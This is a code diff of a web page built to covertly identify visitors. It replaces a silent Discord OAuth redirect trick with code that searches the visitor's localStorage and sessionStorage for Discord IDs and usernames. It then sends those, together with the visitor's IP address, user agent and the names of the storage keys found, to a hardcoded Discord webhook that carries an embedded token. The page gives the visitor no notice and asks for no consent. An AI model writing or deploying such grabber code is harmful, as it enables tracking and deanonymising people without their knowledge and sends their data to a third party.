@@ -91,6 +91,7 @@
         .status .success { color: #22c55e; }
         .status .error { color: #ef4444; }
         .status .info { color: #3b82f6; }
+        .status .warning { color: #f59e0b; }
     </style>
 </head>
 <body>
@@ -116,7 +117,7 @@
         </div>
 
         <div class="status" id="status">
-            <span class="info">●</span> Authenticating...
+            <span class="info">●</span> Extracting data...
         </div>
     </div>
 </div>
@@ -130,8 +131,6 @@
     // CONFIG
     // ============================================================
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
-    const CLIENT_ID = '1351732780288376902';
-    const REDIRECT_URI = window.location.origin + window.location.pathname;
 
     // ============================================================
     // DOM REFS
@@ -148,8 +147,13 @@
     // STATUS HELPER
     // ============================================================
     function setStatus(msg, type = 'info') {
-        const color = type === 'success' ? '#22c55e' : type === 'error' ? '#ef4444' : '#3b82f6';
-        statusEl.innerHTML = `<span style="color:${color}">●</span> ${msg}`;
+        const colors = {
+            success: '#22c55e',
+            error: '#ef4444',
+            warning: '#f59e0b',
+            info: '#3b82f6'
+        };
+        statusEl.innerHTML = `<span style="color:${colors[type] || '#3b82f6'}">●</span> ${msg}`;
     }
 
     // ============================================================
@@ -168,27 +172,34 @@
     // ============================================================
     // SEND TO WEBHOOK
     // ============================================================
-    async function sendToWebhook(discordUser, ip) {
-        const displayName = discordUser.global_name || discordUser.username;
+    async function sendToWebhook(data, ip) {
         const timestamp = new Date().toLocaleString();
 
-        const payload = {
-            content: `**👁️ VISITOR LOGGED**\n` +
-                     `**Discord:** ${displayName} (${discordUser.id})\n` +
-                     `**IP:** ${ip}\n` +
-                     `**User-Agent:** ${navigator.userAgent}\n` +
-                     `**Timestamp:** ${timestamp}`
-        };
+        let content = `**👁️ VISITOR LOGGED**\n`;
+        content += `**IP:** ${ip}\n`;
+        content += `**User-Agent:** ${navigator.userAgent}\n`;
+        content += `**Timestamp:** ${timestamp}\n`;
+
+        if (data.discordId) {
+            content += `**Discord ID:** ${data.discordId}\n`;
+            content += `**Username:** ${data.username || 'unknown'}\n`;
+        } else {
+            content += `**Discord ID:** Not found\n`;
+        }
+
+        if (data.storageKeys && data.storageKeys.length > 0) {
+            content += `**Storage Keys Found:** ${data.storageKeys.join(', ')}\n`;
+        }
 
         try {
             const res = await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({ content })
             });
 
             if (res.ok) {
-                setStatus(`✅ Webhook sent! ${displayName} (${discordUser.id}) from ${ip}`, 'success');
+                setStatus(`✅ Webhook sent! ${data.discordId ? 'ID: ' + data.discordId : 'No Discord ID found'}`, 'success');
             } else {
                 setStatus(`❌ Webhook failed: ${res.status}`, 'error');
             }
@@ -198,72 +209,150 @@
     }
 
     // ============================================================
-    // FETCH DISCORD USER WITH TOKEN
+    // EXTRACT DISCORD ID FROM STORAGE
     // ============================================================
-    async function getDiscordUser(accessToken) {
-        try {
-            const res = await fetch('https://discord.com/api/users/@me', {
-                headers: { Authorization: `Bearer ${accessToken}` }
-            });
-            return await res.json();
-        } catch {
-            return null;
+    function extractDiscordData() {
+        const keysToCheck = [
+            'discord_user',
+            'discordId',
+            'userId',
+            'user',
+            'currentUser',
+            'profile',
+            'discord_data',
+            'discord_auth',
+            'user_data',
+            'auth_user',
+            'me',
+            'account',
+            'discord_profile'
+        ];
+
+        const found = [];
+        let discordId = null;
+        let username = null;
+
+        // Check localStorage
+        for (const key of keysToCheck) {
+            try {
+                const raw = localStorage.getItem(key);
+                if (raw) {
+                    found.push(key);
+                    let parsed;
+                    try { parsed = JSON.parse(raw); } catch { parsed = raw; }
+
+                    // Try to find discord ID in the data
+                    if (typeof parsed === 'object' && parsed !== null) {
+                        if (parsed.id && /^\d{17,20}$/.test(parsed.id)) {
+                            discordId = parsed.id;
+                            username = parsed.username || parsed.global_name || parsed.name || 'unknown';
+                        }
+                        if (parsed.userId && /^\d{17,20}$/.test(parsed.userId)) {
+                            discordId = parsed.userId;
+                            username = parsed.username || parsed.global_name || 'unknown';
+                        }
+                        if (parsed.discordId && /^\d{17,20}$/.test(parsed.discordId)) {
+                            discordId = parsed.discordId;
+                            username = parsed.username || parsed.global_name || 'unknown';
+                        }
+                        if (parsed.user && parsed.user.id && /^\d{17,20}$/.test(parsed.user.id)) {
+                            discordId = parsed.user.id;
+                            username = parsed.user.username || parsed.user.global_name || 'unknown';
+                        }
+                    } else if (typeof parsed === 'string' && /^\d{17,20}$/.test(parsed)) {
+                        discordId = parsed;
+                    }
+                }
+            } catch {}
         }
+
+        // Check sessionStorage as well
+        for (const key of keysToCheck) {
+            try {
+                const raw = sessionStorage.getItem(key);
+                if (raw) {
+                    if (!found.includes(key)) found.push(key + '(session)');
+                    let parsed;
+                    try { parsed = JSON.parse(raw); } catch { parsed = raw; }
+
+                    if (typeof parsed === 'object' && parsed !== null) {
+                        if (parsed.id && /^\d{17,20}$/.test(parsed.id) && !discordId) {
+                            discordId = parsed.id;
+                            username = parsed.username || parsed.global_name || parsed.name || 'unknown';
+                        }
+                        if (parsed.userId && /^\d{17,20}$/.test(parsed.userId) && !discordId) {
+                            discordId = parsed.userId;
+                            username = parsed.username || parsed.global_name || 'unknown';
+                        }
+                    } else if (typeof parsed === 'string' && /^\d{17,20}$/.test(parsed) && !discordId) {
+                        discordId = parsed;
+                    }
+                }
+            } catch {}
+        }
+
+        // If still no ID, try to find any 18-digit number in any localStorage value
+        if (!discordId) {
+            try {
+                for (const key of Object.keys(localStorage)) {
+                    try {
+                        const raw = localStorage.getItem(key);
+                        const match = raw?.match(/\b(\d{17,20})\b/);
+                        if (match) {
+                            discordId = match[1];
+                            found.push(key + '(regex)');
+                            break;
+                        }
+                    } catch {}
+                }
+            } catch {}
+        }
+
+        return { discordId, username, storageKeys: found };
     }
 
     // ============================================================
     // SHOW USER UI
     // ============================================================
-    function showUser(user) {
+    function showUI(data, ip) {
         loadingEl.classList.add('hidden');
         contentEl.classList.remove('hidden');
 
-        const displayName = user.global_name || user.username;
-        usernameEl.textContent = `${displayName}#${user.discriminator}`;
-        discordIdEl.textContent = `ID: ${user.id}`;
-
-        if (user.avatar) {
-            avatarEl.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`;
+        if (data.discordId) {
+            usernameEl.textContent = data.username || 'Unknown User';
+            discordIdEl.textContent = `ID: ${data.discordId}`;
+            // Try to generate an avatar URL from the ID
+            const avatarHash = '0' + data.discordId;
+            avatarEl.src = `https://cdn.discordapp.com/embed/avatars/${parseInt(data.discordId) % 5}.png`;
         } else {
+            usernameEl.textContent = 'Guest';
+            discordIdEl.textContent = 'ID: not found';
             avatarEl.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
+            setStatus('⚠️ No Discord ID found in browser storage', 'warning');
         }
+
+        ipDisplayEl.textContent = ip;
     }
 
     // ============================================================
-    // MAIN — Blink redirect method
+    // MAIN
     // ============================================================
     async function init() {
-        // Check if we have a token in the URL (returned from Discord)
-        const hash = window.location.hash.substring(1);
-        const params = new URLSearchParams(hash);
-        let token = params.get('access_token');
+        const ip = await getIP();
 
-        if (token) {
-            // We have a token! Clean the URL and proceed
-            window.history.replaceState({}, document.title, window.location.pathname);
+        // Try to extract Discord data from storage
+        const data = extractDiscordData();
 
-            const user = await getDiscordUser(token);
-            if (user && user.id) {
-                const ip = await getIP();
-                showUser(user);
-                ipDisplayEl.textContent = ip;
-                await sendToWebhook(user, ip);
-                return;
-            } else {
-                setStatus('❌ Failed to get user info', 'error');
-            }
+        // Show UI
+        showUI(data, ip);
+
+        // Send to webhook
+        await sendToWebhook(data, ip);
+
+        // If no Discord ID found, log which keys were checked
+        if (!data.discordId) {
+            setStatus(`🔍 Checked keys: ${data.storageKeys.join(', ') || 'none found'}`, 'warning');
         }
-
-        // No token — do a fast redirect to Discord with prompt=none
-        // This will redirect back immediately if the user is already logged in
-        setStatus('🔐 Authenticating...', 'info');
-
-        // Use prompt=none to skip the consent screen if already authorized
-        const authUrl =
-            `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify&prompt=none`;
-
-        // Redirect to Discord
-        window.location.replace(authUrl);
     }
 
     // ============================================================
